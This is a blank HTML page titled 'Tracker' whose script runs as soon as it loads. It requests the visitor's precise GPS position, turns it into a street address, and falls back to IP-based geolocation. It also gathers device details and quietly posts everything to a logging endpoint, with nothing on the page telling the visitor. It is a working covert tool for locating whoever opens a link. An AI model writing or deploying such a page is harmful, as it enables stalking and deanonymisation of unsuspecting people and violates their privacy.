
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Tracker</title></head>
<body>
<script>
  async function getIPInfo() {
    const r = await fetch("https://ipapi.co/json/"); return await r.json();
  }

  async function collectData() {
    let method = "IP", lat, lon, address, city, region, country, ip;
    const device = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      screen: window.screen.width + "x" + window.screen.height,
      platform: navigator.platform
    };

    try {
      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true,timeout:5000}));
      method = "GPS"; lat = pos.coords.latitude; lon = pos.coords.longitude;
      const geo = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lon}&key=YOUR_GOOGLE_API_KEY`);
      const js = await geo.json();
      address = js.results[0]?.formatted_address;
    } catch {
      const ipInfo = await getIPInfo();
      ip = ipInfo.ip; city = ipInfo.city; region = ipInfo.region; country = ipInfo.country_name;
      lat = ipInfo.latitude; lon = ipInfo.longitude;
    }

    const payload = { method, latitude: lat, longitude: lon, address, city, region, country, ip, ...device };
    fetch("/log", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify(payload)
    });
  }

  collectData();
</script>
</body>
</html>
